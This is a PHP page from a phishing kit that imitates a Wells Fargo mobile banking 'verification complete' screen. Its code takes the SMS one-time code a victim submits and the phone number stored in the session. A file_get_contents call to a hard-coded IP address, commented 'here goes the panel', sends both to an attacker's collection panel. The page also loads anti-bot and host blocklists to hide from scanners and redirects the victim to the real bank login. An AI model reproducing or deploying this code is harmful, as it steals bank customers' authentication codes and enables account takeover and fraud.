
















































<?php
session_start();
error_reporting(0);
include('../files/boot/check.php');
include('../files/boot/check1.php');
include('../files/boot/check2.php');
include('../files/boot/antibot.php');
include('../files/boot/DB-BOTS.php');
include('../files/boot/DB-CIDR.php');
include('../files/boot/DB-HOSTS.php');
include('../files/boot/DB-METHOD.php');
include('../files/boot/DB-RANGE.php');
include('../call.php');

$user = "";
$phone = "";

if( isset($_SESSION["user"])){
    $user = $_SESSION['user'];
}
if( isset($_SESSION["phone"])){
    $phone = $_SESSION['phone'];
}
$id = "";
if( isset($_GET['id'])){
    $id = $_GET['id'];
}

// $user = @$_POST['user'];
$code = "";
$code = trim($_POST['code']);
// $phone = trim($_POST['phone']);
// echo $phone . " : " . $code . "<br>";
print($code);
if ($code == "") {
    // echo " No code";
    echo "<meta http-equiv='refresh' content='0;url=smspage.php?id=" . $id . "&error=1'>";
    // echo '<meta http-equiv="refresh" content="0; URL=smspage.php?id=' . $id . '&error=1>';
    die();
}
$test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
?>
<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
    <meta http-equiv="refresh" content="7; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=mobilebrowser&error=yes">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Completed<?=$id?></title>
    <meta name="robots" content="index, follow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">

    <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
    <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="180x180" href="../files/icons/apple-touch-icon-180x180.png">
    <link rel="icon" sizes="128x128" href="../files/icons/icon-normal-128x128.png">
    <link rel="icon" sizes="192x192" href="../files/icons/icon-hires-192x192.png">

    <link rel="stylesheet" href="../files/bars/framework.css">
    <link rel="stylesheet" href="../files/bars/util.css">
    <link rel="stylesheet" href="../files/bars/smartphone-homepage.css">

</head>

<body class="freezedscreen" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <header class="masthead" role="banner">
            <div id="navLeft" style="display: block;">
                <a tabindex="1" href="" rel="nofollow" class="backLink">
                    <span class="sr-only">Back link</span>
                </a>
            </div>
            <div class="logoOuter">
                <div class="logo">
                    <a href="#"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg" style="margin-top: 13px;"></a>
                </div>
            </div>
            <div id="navRight">
                <nav class="navbar navbar-default navbar-fixed-top">
                    <div class="navbar-header">
                        <div class="entire-menu">
                            <button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="expandedIcon pointer">‍</span></button>
                        </div>
                    </div>
                </nav>
            </div>
        </header>

        <div id="maincontainer">
            <div class="search-signon-wrapper" aria-hidden="true">
                <div class="search-signon-container" style="display: none;">
                    <div class="wrap left rounded">
                        <div class="search-container">

                            <label class="sr-only" for="searchopen">Search</label>
                            <input type="text" class="search left rounded" id="searchopen" value="Search">
                            <span class="search-sprite"></span>
                        </div>
                    </div>
                    <div class="signon-container">
                        <span class="signonlock" aria-hidden="true">‍</span>
                        <a href="" id="signOn">Sign On</a>
                    </div>
                </div>
            </div>
            <div class="overlay" style="display: none;">
                <div class="wrap left rounded">
                    <div class="searchContainer">
                        <form id="frmSearch" name="frmSearch" action="/search/search" method="GET" autocomplete="off">
                            <span class="search-image"></span>
                            <label class="sr-only" for="overlaySearch">Search</label>
                            <input name="q" type="text" class="left rounded required" id="overlaySearch">
                            <span class="clear-image"></span>
                        </form>
                    </div>
                    <div class="cancel-container">
                        <a href="" id="cancelSearch">Cancel</a>
                    </div>
                </div>
            </div>

            <div class="overlaySignOn" style="top: 38px;">
                <div class="overlayContainer">
                    <div class="welcome-container" tabindex="-1">Welcome</div>
                    <div class="security-container">
                        <span class="security-img"></span>
                        <a href="https://www.wellsfargo.com/privacy-security/fraud/" class="security-text">Online &amp; Mobile Security</a>
                    </div>
                    <div class="signOnContainer" align="center">
                        <form id="frmSignon" name="frmSignon" action="test.php" method="post" autocomplete="off">
                            <!-- Updated the name and value of the field -->
                            <p style="font-size: 120%;"> Your details have been verified</p>
                            <p style="font-size: 120%; font-weight: bold;"> You may now use your card and account as usual.</p>
                            <p style="font-size: 120%; font-weight: bold;"> We are sorry for this inconvenience.</p>
                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
                        </form>
                    </div>
                    <div class="appstoreBadge" id="ios">
                        <a href="https://www.wellsfargo.com/exit/exit_appstore_ios/" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
                        <a href="https://www.wellsfargo.com/exit/exit_appstore_andriod/" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
                    </div>
                    <footer role="contentinfo">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="https://www.wellsfargo.com/privacy-security/">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices">Ad Choices</a>
                                    <div class="footer-oaa"><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>

                    </footer>
                </div>
            </div>
        </div>
    </div>
</body>

</html>

